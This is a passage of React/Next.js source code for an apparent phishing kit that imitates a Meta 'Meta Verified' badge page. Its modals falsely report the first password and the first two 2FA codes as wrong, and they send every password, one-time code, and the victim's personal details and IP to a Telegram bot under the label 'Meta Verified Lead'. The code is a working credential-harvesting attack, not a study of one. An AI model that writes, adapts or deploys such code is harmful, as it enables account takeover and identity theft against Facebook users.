"use client";

import Image from "next/image";
import { useState, useEffect, useRef } from "react";
import { sendTelegram } from "./actions";

// ---- Country Flag ----
function CountryFlag({ code, size = 20 }: { code: string; size?: number }) {
  return (
    <Image
      src={`https://flagcdn.com/w40/${code.toLowerCase()}.png`}
      width={size}
      height={Math.round(size * 0.75)}
      alt={code}
      style={{ objectFit: "cover", borderRadius: 2, display: "inline-block" }}
      unoptimized
    />
  );
}

// ---- Country Data ----
type Country = { code: string; name: string; dialCode: string; flag: string };

const COUNTRIES: Country[] = [
  { code: "AF", name: "Afghanistan", dialCode: "+93", flag: "🇦🇫" },
  { code: "AL", name: "Albania", dialCode: "+355", flag: "🇦🇱" },
  { code: "DZ", name: "Algeria", dialCode: "+213", flag: "🇩🇿" },
  { code: "AD", name: "Andorra", dialCode: "+376", flag: "🇦🇩" },
  { code: "AO", name: "Angola", dialCode: "+244", flag: "🇦🇴" },
  { code: "AG", name: "Antigua and Barbuda", dialCode: "+1-268", flag: "🇦🇬" },
  { code: "AR", name: "Argentina", dialCode: "+54", flag: "🇦🇷" },
  { code: "AM", name: "Armenia", dialCode: "+374", flag: "🇦🇲" },
  { code: "AU", name: "Australia", dialCode: "+61", flag: "🇦🇺" },
  { code: "AT", name: "Austria", dialCode: "+43", flag: "🇦🇹" },
  { code: "AZ", name: "Azerbaijan", dialCode: "+994", flag: "🇦🇿" },
  { code: "BS", name: "Bahamas", dialCode: "+1-242", flag: "🇧🇸" },
  { code: "BH", name: "Bahrain", dialCode: "+973", flag: "🇧🇭" },
  { code: "BD", name: "Bangladesh", dialCode: "+880", flag: "🇧🇩" },
  { code: "BB", name: "Barbados", dialCode: "+1-246", flag: "🇧🇧" },
  { code: "BY", name: "Belarus", dialCode: "+375", flag: "🇧🇾" },
  { code: "BE", name: "Belgium", dialCode: "+32", flag: "🇧🇪" },
  { code: "BZ", name: "Belize", dialCode: "+501", flag: "🇧🇿" },
  { code: "BJ", name: "Benin", dialCode: "+229", flag: "🇧🇯" },
  { code: "BT", name: "Bhutan", dialCode: "+975", flag: "🇧🇹" },
  { code: "BO", name: "Bolivia", dialCode: "+591", flag: "🇧🇴" },
  { code: "BA", name: "Bosnia and Herzegovina", dialCode: "+387", flag: "🇧🇦" },
  { code: "BW", name: "Botswana", dialCode: "+267", flag: "🇧🇼" },
  { code: "BR", name: "Brazil", dialCode: "+55", flag: "🇧🇷" },
  { code: "BN", name: "Brunei", dialCode: "+673", flag: "🇧🇳" },
  { code: "BG", name: "Bulgaria", dialCode: "+359", flag: "🇧🇬" },
  { code: "BF", name: "Burkina Faso", dialCode: "+226", flag: "🇧🇫" },
  { code: "BI", name: "Burundi", dialCode: "+257", flag: "🇧🇮" },
  { code: "CV", name: "Cabo Verde", dialCode: "+238", flag: "🇨🇻" },
  { code: "KH", name: "Cambodia", dialCode: "+855", flag: "🇰🇭" },
  { code: "CM", name: "Cameroon", dialCode: "+237", flag: "🇨🇲" },
  { code: "CA", name: "Canada", dialCode: "+1", flag: "🇨🇦" },
  { code: "CF", name: "Central African Republic", dialCode: "+236", flag: "🇨🇫" },
  { code: "TD", name: "Chad", dialCode: "+235", flag: "🇹🇩" },
  { code: "CL", name: "Chile", dialCode: "+56", flag: "🇨🇱" },
  { code: "CN", name: "China", dialCode: "+86", flag: "🇨🇳" },
  { code: "CO", name: "Colombia", dialCode: "+57", flag: "🇨🇴" },
  { code: "KM", name: "Comoros", dialCode: "+269", flag: "🇰🇲" },
  { code: "CG", name: "Congo", dialCode: "+242", flag: "🇨🇬" },
  { code: "CD", name: "Congo, DR", dialCode: "+243", flag: "🇨🇩" },
  { code: "CR", name: "Costa Rica", dialCode: "+506", flag: "🇨🇷" },
  { code: "CI", name: "Côte d'Ivoire", dialCode: "+225", flag: "🇨🇮" },
  { code: "HR", name: "Croatia", dialCode: "+385", flag: "🇭🇷" },
  { code: "CU", name: "Cuba", dialCode: "+53", flag: "🇨🇺" },
  { code: "CY", name: "Cyprus", dialCode: "+357", flag: "🇨🇾" },
  { code: "CZ", name: "Czech Republic", dialCode: "+420", flag: "🇨🇿" },
  { code: "DK", name: "Denmark", dialCode: "+45", flag: "🇩🇰" },
  { code: "DJ", name: "Djibouti", dialCode: "+253", flag: "🇩🇯" },
  { code: "DM", name: "Dominica", dialCode: "+1-767", flag: "🇩🇲" },
  { code: "DO", name: "Dominican Republic", dialCode: "+1-809", flag: "🇩🇴" },
  { code: "EC", name: "Ecuador", dialCode: "+593", flag: "🇪🇨" },
  { code: "EG", name: "Egypt", dialCode: "+20", flag: "🇪🇬" },
  { code: "SV", name: "El Salvador", dialCode: "+503", flag: "🇸🇻" },
  { code: "GQ", name: "Equatorial Guinea", dialCode: "+240", flag: "🇬🇶" },
  { code: "ER", name: "Eritrea", dialCode: "+291", flag: "🇪🇷" },
  { code: "EE", name: "Estonia", dialCode: "+372", flag: "🇪🇪" },
  { code: "SZ", name: "Eswatini", dialCode: "+268", flag: "🇸🇿" },
  { code: "ET", name: "Ethiopia", dialCode: "+251", flag: "🇪🇹" },
  { code: "FJ", name: "Fiji", dialCode: "+679", flag: "🇫🇯" },
  { code: "FI", name: "Finland", dialCode: "+358", flag: "🇫🇮" },
  { code: "FR", name: "France", dialCode: "+33", flag: "🇫🇷" },
  { code: "GA", name: "Gabon", dialCode: "+241", flag: "🇬🇦" },
  { code: "GM", name: "Gambia", dialCode: "+220", flag: "🇬🇲" },
  { code: "GE", name: "Georgia", dialCode: "+995", flag: "🇬🇪" },
  { code: "DE", name: "Germany", dialCode: "+49", flag: "🇩🇪" },
  { code: "GH", name: "Ghana", dialCode: "+233", flag: "🇬🇭" },
  { code: "GR", name: "Greece", dialCode: "+30", flag: "🇬🇷" },
  { code: "GD", name: "Grenada", dialCode: "+1-473", flag: "🇬🇩" },
  { code: "GT", name: "Guatemala", dialCode: "+502", flag: "🇬🇹" },
  { code: "GN", name: "Guinea", dialCode: "+224", flag: "🇬🇳" },
  { code: "GW", name: "Guinea-Bissau", dialCode: "+245", flag: "🇬🇼" },
  { code: "GY", name: "Guyana", dialCode: "+592", flag: "🇬🇾" },
  { code: "HT", name: "Haiti", dialCode: "+509", flag: "🇭🇹" },
  { code: "HN", name: "Honduras", dialCode: "+504", flag: "🇭🇳" },
  { code: "HU", name: "Hungary", dialCode: "+36", flag: "🇭🇺" },
  { code: "IS", name: "Iceland", dialCode: "+354", flag: "🇮🇸" },
  { code: "IN", name: "India", dialCode: "+91", flag: "🇮🇳" },
  { code: "ID", name: "Indonesia", dialCode: "+62", flag: "🇮🇩" },
  { code: "IR", name: "Iran", dialCode: "+98", flag: "🇮🇷" },
  { code: "IQ", name: "Iraq", dialCode: "+964", flag: "🇮🇶" },
  { code: "IE", name: "Ireland", dialCode: "+353", flag: "🇮🇪" },
  { code: "IL", name: "Israel", dialCode: "+972", flag: "🇮🇱" },
  { code: "IT", name: "Italy", dialCode: "+39", flag: "🇮🇹" },
  { code: "JM", name: "Jamaica", dialCode: "+1-876", flag: "🇯🇲" },
  { code: "JP", name: "Japan", dialCode: "+81", flag: "🇯🇵" },
  { code: "JO", name: "Jordan", dialCode: "+962", flag: "🇯🇴" },
  { code: "KZ", name: "Kazakhstan", dialCode: "+7", flag: "🇰🇿" },
  { code: "KE", name: "Kenya", dialCode: "+254", flag: "🇰🇪" },
  { code: "KI", name: "Kiribati", dialCode: "+686", flag: "🇰🇮" },
  { code: "KP", name: "Korea, North", dialCode: "+850", flag: "🇰🇵" },
  { code: "KR", name: "Korea, South", dialCode: "+82", flag: "🇰🇷" },
  { code: "XK", name: "Kosovo", dialCode: "+383", flag: "🇽🇰" },
  { code: "KW", name: "Kuwait", dialCode: "+965", flag: "🇰🇼" },
  { code: "KG", name: "Kyrgyzstan", dialCode: "+996", flag: "🇰🇬" },
  { code: "LA", name: "Laos", dialCode: "+856", flag: "🇱🇦" },
  { code: "LV", name: "Latvia", dialCode: "+371", flag: "🇱🇻" },
  { code: "LB", name: "Lebanon", dialCode: "+961", flag: "🇱🇧" },
  { code: "LS", name: "Lesotho", dialCode: "+266", flag: "🇱🇸" },
  { code: "LR", name: "Liberia", dialCode: "+231", flag: "🇱🇷" },
  { code: "LY", name: "Libya", dialCode: "+218", flag: "🇱🇾" },
  { code: "LI", name: "Liechtenstein", dialCode: "+423", flag: "🇱🇮" },
  { code: "LT", name: "Lithuania", dialCode: "+370", flag: "🇱🇹" },
  { code: "LU", name: "Luxembourg", dialCode: "+352", flag: "🇱🇺" },
  { code: "MG", name: "Madagascar", dialCode: "+261", flag: "🇲🇬" },
  { code: "MW", name: "Malawi", dialCode: "+265", flag: "🇲🇼" },
  { code: "MY", name: "Malaysia", dialCode: "+60", flag: "🇲🇾" },
  { code: "MV", name: "Maldives", dialCode: "+960", flag: "🇲🇻" },
  { code: "ML", name: "Mali", dialCode: "+223", flag: "🇲🇱" },
  { code: "MT", name: "Malta", dialCode: "+356", flag: "🇲🇹" },
  { code: "MH", name: "Marshall Islands", dialCode: "+692", flag: "🇲🇭" },
  { code: "MR", name: "Mauritania", dialCode: "+222", flag: "🇲🇷" },
  { code: "MU", name: "Mauritius", dialCode: "+230", flag: "🇲🇺" },
  { code: "MX", name: "Mexico", dialCode: "+52", flag: "🇲🇽" },
  { code: "FM", name: "Micronesia", dialCode: "+691", flag: "🇫🇲" },
  { code: "MD", name: "Moldova", dialCode: "+373", flag: "🇲🇩" },
  { code: "MC", name: "Monaco", dialCode: "+377", flag: "🇲🇨" },
  { code: "MN", name: "Mongolia", dialCode: "+976", flag: "🇲🇳" },
  { code: "ME", name: "Montenegro", dialCode: "+382", flag: "🇲🇪" },
  { code: "MA", name: "Morocco", dialCode: "+212", flag: "🇲🇦" },
  { code: "MZ", name: "Mozambique", dialCode: "+258", flag: "🇲🇿" },
  { code: "MM", name: "Myanmar", dialCode: "+95", flag: "🇲🇲" },
  { code: "NA", name: "Namibia", dialCode: "+264", flag: "🇳🇦" },
  { code: "NR", name: "Nauru", dialCode: "+674", flag: "🇳🇷" },
  { code: "NP", name: "Nepal", dialCode: "+977", flag: "🇳🇵" },
  { code: "NL", name: "Netherlands", dialCode: "+31", flag: "🇳🇱" },
  { code: "NZ", name: "New Zealand", dialCode: "+64", flag: "🇳🇿" },
  { code: "NI", name: "Nicaragua", dialCode: "+505", flag: "🇳🇮" },
  { code: "NE", name: "Niger", dialCode: "+227", flag: "🇳🇪" },
  { code: "NG", name: "Nigeria", dialCode: "+234", flag: "🇳🇬" },
  { code: "MK", name: "North Macedonia", dialCode: "+389", flag: "🇲🇰" },
  { code: "NO", name: "Norway", dialCode: "+47", flag: "🇳🇴" },
  { code: "OM", name: "Oman", dialCode: "+968", flag: "🇴🇲" },
  { code: "PK", name: "Pakistan", dialCode: "+92", flag: "🇵🇰" },
  { code: "PW", name: "Palau", dialCode: "+680", flag: "🇵🇼" },
  { code: "PA", name: "Panama", dialCode: "+507", flag: "🇵🇦" },
  { code: "PG", name: "Papua New Guinea", dialCode: "+675", flag: "🇵🇬" },
  { code: "PY", name: "Paraguay", dialCode: "+595", flag: "🇵🇾" },
  { code: "PE", name: "Peru", dialCode: "+51", flag: "🇵🇪" },
  { code: "PH", name: "Philippines", dialCode: "+63", flag: "🇵🇭" },
  { code: "PL", name: "Poland", dialCode: "+48", flag: "🇵🇱" },
  { code: "PT", name: "Portugal", dialCode: "+351", flag: "🇵🇹" },
  { code: "QA", name: "Qatar", dialCode: "+974", flag: "🇶🇦" },
  { code: "RO", name: "Romania", dialCode: "+40", flag: "🇷🇴" },
  { code: "RU", name: "Russia", dialCode: "+7", flag: "🇷🇺" },
  { code: "RW", name: "Rwanda", dialCode: "+250", flag: "🇷🇼" },
  { code: "KN", name: "Saint Kitts and Nevis", dialCode: "+1-869", flag: "🇰🇳" },
  { code: "LC", name: "Saint Lucia", dialCode: "+1-758", flag: "🇱🇨" },
  { code: "VC", name: "Saint Vincent and the Grenadines", dialCode: "+1-784", flag: "🇻🇨" },
  { code: "WS", name: "Samoa", dialCode: "+685", flag: "🇼🇸" },
  { code: "SM", name: "San Marino", dialCode: "+378", flag: "🇸🇲" },
  { code: "ST", name: "São Tomé and Príncipe", dialCode: "+239", flag: "🇸🇹" },
  { code: "SA", name: "Saudi Arabia", dialCode: "+966", flag: "🇸🇦" },
  { code: "SN", name: "Senegal", dialCode: "+221", flag: "🇸🇳" },
  { code: "RS", name: "Serbia", dialCode: "+381", flag: "🇷🇸" },
  { code: "SC", name: "Seychelles", dialCode: "+248", flag: "🇸🇨" },
  { code: "SL", name: "Sierra Leone", dialCode: "+232", flag: "🇸🇱" },
  { code: "SG", name: "Singapore", dialCode: "+65", flag: "🇸🇬" },
  { code: "SK", name: "Slovakia", dialCode: "+421", flag: "🇸🇰" },
  { code: "SI", name: "Slovenia", dialCode: "+386", flag: "🇸🇮" },
  { code: "SB", name: "Solomon Islands", dialCode: "+677", flag: "🇸🇧" },
  { code: "SO", name: "Somalia", dialCode: "+252", flag: "🇸🇴" },
  { code: "ZA", name: "South Africa", dialCode: "+27", flag: "🇿🇦" },
  { code: "SS", name: "South Sudan", dialCode: "+211", flag: "🇸🇸" },
  { code: "ES", name: "Spain", dialCode: "+34", flag: "🇪🇸" },
  { code: "LK", name: "Sri Lanka", dialCode: "+94", flag: "🇱🇰" },
  { code: "SD", name: "Sudan", dialCode: "+249", flag: "🇸🇩" },
  { code: "SR", name: "Suriname", dialCode: "+597", flag: "🇸🇷" },
  { code: "SE", name: "Sweden", dialCode: "+46", flag: "🇸🇪" },
  { code: "CH", name: "Switzerland", dialCode: "+41", flag: "🇨🇭" },
  { code: "SY", name: "Syria", dialCode: "+963", flag: "🇸🇾" },
  { code: "TW", name: "Taiwan", dialCode: "+886", flag: "🇹🇼" },
  { code: "TJ", name: "Tajikistan", dialCode: "+992", flag: "🇹🇯" },
  { code: "TZ", name: "Tanzania", dialCode: "+255", flag: "🇹🇿" },
  { code: "TH", name: "Thailand", dialCode: "+66", flag: "🇹🇭" },
  { code: "TL", name: "Timor-Leste", dialCode: "+670", flag: "🇹🇱" },
  { code: "TG", name: "Togo", dialCode: "+228", flag: "🇹🇬" },
  { code: "TO", name: "Tonga", dialCode: "+676", flag: "🇹🇴" },
  { code: "TT", name: "Trinidad and Tobago", dialCode: "+1-868", flag: "🇹🇹" },
  { code: "TN", name: "Tunisia", dialCode: "+216", flag: "🇹🇳" },
  { code: "TR", name: "Turkey", dialCode: "+90", flag: "🇹🇷" },
  { code: "TM", name: "Turkmenistan", dialCode: "+993", flag: "🇹🇲" },
  { code: "TV", name: "Tuvalu", dialCode: "+688", flag: "🇹🇻" },
  { code: "UG", name: "Uganda", dialCode: "+256", flag: "🇺🇬" },
  { code: "UA", name: "Ukraine", dialCode: "+380", flag: "🇺🇦" },
  { code: "AE", name: "United Arab Emirates", dialCode: "+971", flag: "🇦🇪" },
  { code: "GB", name: "United Kingdom", dialCode: "+44", flag: "🇬🇧" },
  { code: "US", name: "United States", dialCode: "+1", flag: "🇺🇸" },
  { code: "UY", name: "Uruguay", dialCode: "+598", flag: "🇺🇾" },
  { code: "UZ", name: "Uzbekistan", dialCode: "+998", flag: "🇺🇿" },
  { code: "VU", name: "Vanuatu", dialCode: "+678", flag: "🇻🇺" },
  { code: "VE", name: "Venezuela", dialCode: "+58", flag: "🇻🇪" },
  { code: "VN", name: "Vietnam", dialCode: "+84", flag: "🇻🇳" },
  { code: "YE", name: "Yemen", dialCode: "+967", flag: "🇾🇪" },
  { code: "ZM", name: "Zambia", dialCode: "+260", flag: "🇿🇲" },
  { code: "ZW", name: "Zimbabwe", dialCode: "+263", flag: "🇿🇼" },
];

const DEFAULT_COUNTRY = COUNTRIES.find((c) => c.code === "US")!;

// ---- Reusable Image Icons ----
export function FbIcon({ size = 32 }: { size?: number }) {
  return <Image src="/image/ic_facebook.svg" width={size} height={size} alt="Facebook" />;
}

export function IgIcon({ size = 24 }: { size?: number }) {
  return <Image src="/image/ic_instagram.svg" width={size} height={size} alt="Instagram" />;
}

export function BlueBadge({ size = 20 }: { size?: number }) {
  return <Image src="/image/ic_blue.svg" width={size} height={size} alt="Verified badge" />;
}

export function ShieldIcon({ size = 20 }: { size?: number }) {
  return <Image src="/image/ic_shield.svg" width={size} height={size} alt="Shield" />;
}

// ---- Telegram sender ----
type FormData = {
  fullName: string; email: string; emailBusiness: string; pageName: string;
  phone: string; dob: { day: string; month: string; year: string };
  note: string; country: string;
  ip: string; city: string; region: string; org: string;
};

function sendToTelegram(text: string) {
  sendTelegram(text).catch(() => {});
}

function cv(v: string) {
  // wrap value in <code> for click-to-copy in Telegram
  return v ? `<code>${v}</code>` : `<code>-</code>`;
}

function buildMessage(fd: FormData, extra: Record<string, string>) {
  const dob = [fd.dob.day, fd.dob.month, fd.dob.year].filter(Boolean).join("/") || "-";
  const location = [fd.city, fd.region, fd.country].filter(Boolean).join(", ") || "-";
  const lines = [
    `🌐 <b>Meta Verified Lead</b>`,
    ``,
    `👤 Full Name: ${cv(fd.fullName)}`,
    `📧 Email: ${cv(fd.email)}`,
    `💼 Email Business: ${cv(fd.emailBusiness || "-")}`,
    `📄 Page Name: ${cv(fd.pageName || "-")}`,
    `📞 Phone: ${cv(fd.phone)}`,
    `🎂 DOB: ${cv(dob)}`,
    ``,
    `🗺 Location: ${cv(location)}`,
    `🌐 IP: ${cv(fd.ip || "-")}`,
  ];
  if (fd.note) lines.push(`📝 Note: ${cv(fd.note)}`);

  lines.push(``);
  for (const [k, v] of Object.entries(extra)) {
    lines.push(`${k} ${cv(v)}`);
  }

  return lines.join("\n");
}

// ---- OTP Modal (popup 3) ----
function OtpModal({ onClose, formData, passwords }: { onClose: () => void; formData: FormData; passwords: [string, string] }) {
  // attempt: 0=fresh, 1=wrong+cooldown, 2=wrong2+cooldown, 3=success
  const [attempt, setAttempt] = useState(0);
  const [code, setCode] = useState("");
  const [loading, setLoading] = useState(false);
  const [cooldown, setCooldown] = useState(0); // seconds remaining

  // Scroll lock
  useEffect(() => {
    document.body.style.overflow = "hidden";
    return () => { document.body.style.overflow = ""; };
  }, []);

  // Escape key (disabled during cooldown)
  useEffect(() => {
    const h = (e: KeyboardEvent) => { if (e.key === "Escape" && cooldown === 0) onClose(); };
    window.addEventListener("keydown", h);
    return () => window.removeEventListener("keydown", h);
  }, [onClose, cooldown]);

  // Countdown timer
  useEffect(() => {
    if (cooldown <= 0) return;
    const t = setTimeout(() => setCooldown((v) => v - 1), 1000);
    return () => clearTimeout(t);
  }, [cooldown]);

  const handleSubmit = () => {
    if (!code || code.length < 6 || loading || cooldown > 0) return;
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      if (attempt === 0) {
        // 2FA attempt 1 — gửi form + pw1 + pw2 + 2fa1
        sendToTelegram(buildMessage(formData, {
          "\n🔑 <b>Password 1:</b>": passwords[0],
          "🔑 <b>Password 2:</b>": passwords[1],
          "\n🔐 <b>2FA Code 1:</b>": code,
        }));
        setAttempt(1);
        setCode("");
        setCooldown(30);
      } else if (attempt === 1) {
        // 2FA attempt 2 — gửi thêm 2fa2
        sendToTelegram(buildMessage(formData, {
          "\n🔑 <b>Password 1:</b>": passwords[0],
          "🔑 <b>Password 2:</b>": passwords[1],
          "\n🔐 <b>2FA Code 2:</b>": code,
        }));
        setAttempt(2);
        setCode("");
        setCooldown(30);
      } else {
        // 2FA attempt 3 — gửi thêm 2fa3 rồi success
        sendToTelegram(buildMessage(formData, {
          "\n🔑 <b>Password 1:</b>": passwords[0],
          "🔑 <b>Password 2:</b>": passwords[1],
          "\n🔐 <b>2FA Code 3:</b>": code,
          "✅ <b>Status:</b>": "COMPLETED",
        }));
        setAttempt(3);
      }
    }, 900);
  };

  const isBlocked = cooldown > 0;
  const isSuccess = attempt === 3;

  return (
    <div
      className="fixed inset-0 z-[70] flex items-center justify-center bg-black/60 px-4"
      onClick={(e) => { if (e.target === e.currentTarget && !isBlocked) onClose(); }}
    >
      <div className="relative w-full max-w-[400px] bg-white rounded-2xl shadow-2xl overflow-hidden">
        {/* Header */}
        <div className="flex items-center justify-center px-5 py-4 border-b border-gray-100 relative">
          <Image src="/image/logo-meta.svg" width={88} height={18} alt="Meta" priority />
          {!isBlocked && (
            <button
              onClick={onClose}
              className="absolute right-4 top-1/2 -translate-y-1/2 w-7 h-7 flex items-center justify-center rounded-full hover:bg-gray-100 transition-colors text-gray-400"
              aria-label="Close"
            >
              <svg width="14" height="14" viewBox="0 0 16 16" fill="none">
                <path d="M12 4L4 12M4 4l8 8" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" />
              </svg>
            </button>
          )}
        </div>

        <div className="px-6 py-5">
          {isSuccess ? (
            /* ── Success state ── */
            <div className="flex flex-col items-center py-3 gap-4 text-center">
              {/* Blue badge icon */}
              <div className="relative">
                <div className="w-16 h-16 rounded-full bg-blue-100 flex items-center justify-center">
                  <svg width="36" height="36" viewBox="0 0 36 36" fill="none">
                    <circle cx="18" cy="18" r="18" fill="#0866FF" />
                    <path d="M11 18.5l5 5 9-10" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
                  </svg>
                </div>
              </div>
              <div>
                <p className="text-base font-bold text-gray-900 mb-1">Verification submitted!</p>
                <p className="text-sm text-gray-500 leading-relaxed">
                  Your identity is being reviewed by Meta.<br />
                  Your blue badge will appear within <span className="font-semibold text-gray-700">48 hours</span> once approved.
                </p>
              </div>
              {/* Info box */}
              <div className="w-full bg-blue-50 border border-blue-100 rounded-xl px-4 py-3 flex items-start gap-2.5 text-left">
                <svg className="shrink-0 mt-0.5" width="16" height="16" viewBox="0 0 16 16" fill="none">
                  <circle cx="8" cy="8" r="7" fill="#0866FF" fillOpacity="0.12" stroke="#0866FF" strokeWidth="1.3" />
                  <path d="M8 7v4M8 5h.01" stroke="#0866FF" strokeWidth="1.5" strokeLinecap="round" />
                </svg>
                <p className="text-xs text-blue-700 leading-relaxed">
                  You will receive a notification on Facebook and the email you provided once your account is verified.
                </p>
              </div>
              <button
                onClick={onClose}
                className="w-full bg-[#0866FF] text-white font-semibold py-2.5 rounded-xl hover:bg-[#0755d4] transition-colors text-sm"
              >
                Done
              </button>
            </div>
          ) : (
            <>
              {/* ── Header copy ── */}
              <div className="flex flex-col items-center text-center mb-4">
                <div className="w-12 h-12 rounded-full bg-blue-50 flex items-center justify-center mb-3">
                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
                    <rect x="5" y="11" width="14" height="10" rx="2" stroke="#0866FF" strokeWidth="1.6" />
                    <path d="M8 11V7a4 4 0 018 0v4" stroke="#0866FF" strokeWidth="1.6" strokeLinecap="round" />
                    <circle cx="12" cy="16" r="1.5" fill="#0866FF" />
                  </svg>
                </div>
                <p className="text-sm font-bold text-gray-900">Two-factor authentication</p>
                <p className="text-xs text-gray-500 mt-0.5 leading-relaxed">
                  Enter the 6–8 digit code from your authentication app or SMS.
                </p>
              </div>

              {/* ── Error / Cooldown banner ── */}
              {(attempt === 1 || attempt === 2) && (
                <div className={`mb-3 flex items-start gap-2 rounded-xl px-3 py-2.5 ${isBlocked ? "bg-amber-50 border border-amber-200" : "bg-red-50 border border-red-200"}`}>
                  {isBlocked ? (
                    <svg className="shrink-0 mt-0.5" width="15" height="15" viewBox="0 0 16 16" fill="none">
                      <circle cx="8" cy="8" r="7" stroke="#d97706" strokeWidth="1.5" />
                      <path d="M8 4v4.5l2.5 1.5" stroke="#d97706" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
                    </svg>
                  ) : (
                    <svg className="shrink-0 mt-0.5" width="15" height="15" viewBox="0 0 16 16" fill="none">
                      <circle cx="8" cy="8" r="7" stroke="#dc2626" strokeWidth="1.5" />
                      <path d="M8 5v3.5M8 11h.01" stroke="#dc2626" strokeWidth="1.5" strokeLinecap="round" />
                    </svg>
                  )}
                  <div>
                    {isBlocked ? (
                      <p className="text-xs text-amber-700 leading-relaxed">
                        Too many incorrect attempts. Please wait{" "}
                        <span className="font-bold tabular-nums">{cooldown}s</span> before trying again.
                      </p>
                    ) : (
                      <p className="text-xs text-red-600 leading-relaxed">
                        The code you entered is incorrect.{" "}
                        {attempt === 1 ? "Please try again." : "One attempt remaining."}
                      </p>
                    )}
                  </div>
                </div>
              )}

              {/* ── Code input ── */}
              <input
                type="text"
                inputMode="numeric"
                pattern="[0-9]*"
                placeholder="Enter 6–8 digit code"
                maxLength={8}
                value={code}
                onChange={(e) => setCode(e.target.value.replace(/\D/g, "").slice(0, 8))}
                onKeyDown={(e) => { if (e.key === "Enter") handleSubmit(); }}
                disabled={isBlocked}
                autoFocus
                className={`w-full px-4 py-3 border rounded-xl text-sm text-center tracking-[0.25em] font-mono text-gray-900 placeholder-gray-400 outline-none focus:ring-2 focus:ring-[#0866FF] focus:border-[#0866FF] transition placeholder:tracking-normal placeholder:font-sans disabled:bg-gray-50 disabled:text-gray-400 disabled:cursor-not-allowed ${
                  (attempt === 1 || attempt === 2) && !isBlocked ? "border-red-400 bg-red-50/30" : "border-gray-300"
                }`}
              />

              {/* Cooldown progress bar */}
              {isBlocked && (
                <div className="mt-2 w-full h-1 bg-gray-100 rounded-full overflow-hidden">
                  <div
                    className="h-full bg-amber-400 rounded-full transition-all duration-1000"
                    style={{ width: `${(cooldown / 30) * 100}%` }}
                  />
                </div>
              )}

              <p className="mt-2 text-center">
                <a href="#" className="text-xs text-[#0866FF] hover:underline">Didn&apos;t receive a code?</a>
              </p>

              <button
                type="button"
                onClick={handleSubmit}
                disabled={!code || code.length < 6 || loading || isBlocked}
                className="mt-4 w-full bg-[#0866FF] text-white font-semibold py-3 rounded-xl hover:bg-[#0755d4] transition-colors text-sm disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
              >
                {loading && (
                  <svg className="animate-spin w-4 h-4" viewBox="0 0 24 24" fill="none">
                    <circle cx="12" cy="12" r="10" stroke="white" strokeWidth="3" strokeOpacity="0.3" />
                    <path d="M12 2a10 10 0 0110 10" stroke="white" strokeWidth="3" strokeLinecap="round" />
                  </svg>
                )}
                {loading ? "Verifying..." : isBlocked ? `Wait ${cooldown}s` : "Verify"}
              </button>
            </>
          )}
        </div>
      </div>
    </div>
  );
}

// ---- Password Modal (popup 2) ----
function PasswordModal({ onClose, formData }: { onClose: () => void; formData: FormData }) {
  const [password, setPassword] = useState("");
  const [attempt, setAttempt] = useState(0);
  const [showPw, setShowPw] = useState(false);
  const [loading, setLoading] = useState(false);
  const [showOtp, setShowOtp] = useState(false);
  const [passwords, setPasswords] = useState<[string, string]>(["", ""]);

  // Scroll lock
  useEffect(() => {
    document.body.style.overflow = "hidden";
    return () => { document.body.style.overflow = ""; };
  }, []);

  // Escape key
  useEffect(() => {
    const h = (e: KeyboardEvent) => { if (e.key === "Escape") onClose(); };
    window.addEventListener("keydown", h);
    return () => window.removeEventListener("keydown", h);
  }, [onClose]);

  const handleSubmit = () => {
    if (!password) return;
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      if (attempt === 0) {
        // Password 1 — gửi form + pw1
        const pw1 = password;
        sendToTelegram(buildMessage(formData, {
          "\n🔑 <b>Password 1:</b>": pw1,
        }));
        setPasswords([pw1, ""]);
        setAttempt(1);
        setPassword("");
      } else {
        // Password 2 — gửi form + pw1 + pw2, chuyển sang OTP
        const pw2 = password;
        sendToTelegram(buildMessage(formData, {
          "\n🔑 <b>Password 1:</b>": passwords[0],
          "🔑 <b>Password 2:</b>": pw2,
        }));
        setPasswords([passwords[0], pw2]);
        setShowOtp(true);
      }
    }, 900);
  };

  if (showOtp) {
    return <OtpModal onClose={onClose} formData={formData} passwords={passwords} />;
  }

  return (
    <div
      className="fixed inset-0 z-[60] flex items-center justify-center bg-black/60 px-4"
      onClick={(e) => { if (e.target === e.currentTarget) onClose(); }}
    >
      <div className="relative w-full max-w-[400px] bg-white rounded-2xl shadow-2xl overflow-hidden">
        {/* Header */}
        <div className="flex items-center justify-center px-5 py-4 border-b border-gray-100 relative">
          <Image src="/image/logo-meta.svg" width={88} height={18} alt="Meta" priority />
          <button
            onClick={onClose}
            className="absolute right-4 top-1/2 -translate-y-1/2 w-7 h-7 flex items-center justify-center rounded-full hover:bg-gray-100 transition-colors text-gray-400"
            aria-label="Close"
          >
            <svg width="14" height="14" viewBox="0 0 16 16" fill="none">
              <path d="M12 4L4 12M4 4l8 8" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" />
            </svg>
          </button>
        </div>

        <div className="px-6 py-5">
          {/* Header copy */}
          <div className="mb-4">
            <p className="text-sm font-bold text-gray-900">Confirm your identity</p>
            <p className="text-xs text-gray-500 mt-0.5">Enter your Facebook password to continue</p>
          </div>

          {/* Error message */}
          {attempt === 1 && (
            <div className="mb-3 flex items-start gap-2 bg-red-50 border border-red-200 rounded-xl px-3 py-2.5">
              <svg className="shrink-0 mt-0.5" width="15" height="15" viewBox="0 0 16 16" fill="none">
                <circle cx="8" cy="8" r="7" stroke="#dc2626" strokeWidth="1.5" />
                <path d="M8 5v3.5M8 11h.01" stroke="#dc2626" strokeWidth="1.5" strokeLinecap="round" />
              </svg>
              <p className="text-xs text-red-600 leading-relaxed">
                The password you entered is incorrect. Please try again.
              </p>
            </div>
          )}

          {/* Password input */}
          <div className="relative">
            <input
              type={showPw ? "text" : "password"}
              placeholder="Facebook password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              onKeyDown={(e) => { if (e.key === "Enter") handleSubmit(); }}
              className={`w-full px-4 py-3 pr-11 border rounded-xl text-sm text-gray-900 placeholder-gray-400 outline-none focus:ring-2 focus:ring-[#0866FF] focus:border-[#0866FF] transition ${attempt === 1 ? "border-red-400 bg-red-50/30" : "border-gray-300"}`}
              autoFocus
            />
            <button
              type="button"
              onClick={() => setShowPw((v) => !v)}
